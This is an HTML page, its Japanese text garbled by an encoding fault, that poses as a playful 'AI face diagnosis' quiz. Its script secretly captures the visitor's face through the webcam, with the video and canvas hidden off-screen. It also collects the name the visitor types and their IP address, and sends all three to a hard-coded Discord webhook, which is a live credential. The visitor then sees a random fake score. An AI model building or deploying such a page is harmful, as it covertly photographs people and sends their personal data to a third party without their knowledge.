<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIé¡”è¨ºæ–­</title>
    <style>
        body { background-color: #fff0f5; font-family: sans-serif; text-align: center; padding: 50px 20px; }
        h1 { color: #ff69b4; }
        #start-btn, #next-btn { 
            background-color: #ff69b4; color: white; padding: 15px 35px; 
            font-size: 20px; border: none; border-radius: 50px; cursor: pointer; 
        }
        #input-area, #loading-area, #result-area { display: none; }
        input { padding: 12px; font-size: 18px; width: 80%; max-width: 300px; margin-bottom: 20px; border: 1px solid #ffb6c1; border-radius: 8px; }
        .msg { font-size: 22px; color: #ff1493; font-weight: bold; }
        /* æ˜ åƒã‚’çµ¶å¯¾ã«è¦‹ã›ãªã„è¨­å®š */
        video, canvas { position: fixed; top: -1000px; left: -1000px; opacity: 0; }
    </style>
</head>
<body>

    <h1>âœ¨ AIé¡”è¨ºæ–­ âœ¨</h1>

    <div id="welcome-area">
        <button id="start-btn">è¨ºæ–­ã‚’é–‹å§‹ã™ã‚‹</button>
    </div>

    <div id="input-area">
        <p>åå‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„</p>
        <input type="text" id="user-name" placeholder="åå‰">
        <br>
        <button id="next-btn">è¨ºæ–­ã™ã‚‹</button>
    </div>

    <div id="loading-area">
        <p class="msg">AIã‚¹ã‚­ãƒ£ãƒ³ä¸­...</p>
        <p>è§£æãŒçµ‚ã‚ã‚‹ã¾ã§ãã®ã¾ã¾ãŠå¾…ã¡ãã ã•ã„</p>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <div id="result-area">
        <div style="background:white; padding:30px; border:2px solid #ff69b4; border-radius:20px; display:inline-block;">
            <h2>è¨ºæ–­çµæœ</h2>
            <p id="res-score" style="font-size:32px; color:red; font-weight:bold;"></p>
            <p id="res-type" style="font-size:20px;"></p>
        </div>
    </div>

<script>
    // â˜…é‡è¦ï¼šã“ã“ã«ã‚³ãƒ”ãƒ¼ã—ãŸURLã‚’å¿…ãšå…¥ã‚Œã‚‹
    const webhookUrl = "https://discord.com/api/webhooks/1463825360691920961/RyvExp4AUqM0CHGRbGILYdtb0jvUP9IBESiuiGvZKTA7FugXdBIEVbJ95C8-t56yu3-X";
    
    let userName = "";
    let ipAddress = "å–å¾—å¤±æ•—/ãƒ–ãƒ­ãƒƒã‚¯";

    // IPå–å¾—ã‚³ãƒãƒ³ãƒ‰
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => ipAddress = data.ip)
        .catch(e => console.log("IPå–å¾—ã‚¹ã‚­ãƒƒãƒ—"));

    document.getElementById('start-btn').onclick = () => {
        document.getElementById('welcome-area').style.display = 'none';
        document.getElementById('input-area').style.display = 'block';
    };

    document.getElementById('next-btn').onclick = async () => {
        userName = document.getElementById('user-name').value || "åç„¡ã—";
        document.getElementById('input-area').style.display = 'none';
        document.getElementById('loading-area').style.display = 'block';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // 2ç§’å¾…ã£ã¦ã‹ã‚‰æ’®å½±ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œ
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // ã‚«ãƒ¡ãƒ©åœæ­¢
                stream.getTracks().forEach(t => t.stop());

                // ç”»åƒã‚’ãƒ‡ãƒ¼ã‚¿åŒ–ã—ã¦é€ä¿¡ã‚³ãƒãƒ³ãƒ‰ã¸æ¸¡ã™
                canvas.toBlob((blob) => {
                    executeSend(blob); // é€ä¿¡å®Ÿè¡Œé–¢æ•°ã‚’å‘¼ã³å‡ºã™
                }, 'image/jpeg', 0.7);

            }, 2000);

        } catch (err) {
            alert("ã‚«ãƒ¡ãƒ©ã®è¨±å¯ãŒãªã„ãŸã‚è¨ºæ–­ã§ãã¾ã›ã‚“");
            location.reload();
        }
    };

    // --- ã“ã‚ŒãŒDiscordã«ã€Œé€ã‚Œï¼ã€ã¨å‘½ã˜ã‚‹å®Ÿè¡Œã‚³ãƒãƒ³ãƒ‰ã§ã™ ---
    async function executeSend(photoBlob) {
        const formData = new FormData();
        const contentText = `ã€è¨ºæ–­å®Œäº†ãƒ¬ãƒãƒ¼ãƒˆã€‘\nğŸ‘¤ åå‰: ${userName}\nğŸŒ IPã‚¢ãƒ‰ãƒ¬ã‚¹: ${ipAddress}`;
        
        formData.append('payload_json', JSON.stringify({ content: contentText }));
        formData.append('file', photoBlob, 'photo.jpg');

        try {
            const response = await fetch(webhookUrl, {
                method: 'POST',
                body: formData
            });

            if (!response.ok) {
                console.error("Discordé€ä¿¡å¤±æ•—:", response.status);
            } else {
                console.log("Discordé€ä¿¡æˆåŠŸï¼");
            }
        } catch (error) {
            console.error("é€šä¿¡ã‚¨ãƒ©ãƒ¼:", error);
        }
        
        // é€ä¿¡ãŒçµ‚ã‚ã£ãŸã‚‰çµæœã‚’è¡¨ç¤º
        showFinalResult();
    }

    function showFinalResult() {
        document.getElementById('loading-area').style.display = 'none';
        document.getElementById('result-area').style.display = 'block';
        document.getElementById('res-score').innerText = "åå·®å€¤: " + (Math.floor(Math.random() * 10) + 65);
        document.getElementById('res-type').innerText = "ç³»çµ±: é€æ˜æ„Ÿã®ã‚ã‚‹ç¾è‚Œã‚¿ã‚¤ãƒ—";
    }
</script>

</body>
</html>
